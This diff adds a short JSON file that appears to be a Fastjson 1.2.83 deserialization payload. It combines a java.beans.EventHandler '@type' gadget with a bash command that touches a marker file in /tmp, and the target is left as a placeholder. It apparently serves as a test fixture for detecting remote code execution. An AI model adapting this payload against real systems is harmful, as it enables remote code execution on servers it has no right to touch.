@@ -1,0 +1,10 @@
+{
+  "pb": {
+    "command": ["/bin/bash", "-c", "touch /tmp/fastjson_1_2_83_rce_marker"]
+  },
+  "handler": {
+    "@type": "java.beans.EventHandler",
+    "target": "PLACEHOLDER",
+    "action": "start"
+  }
+}
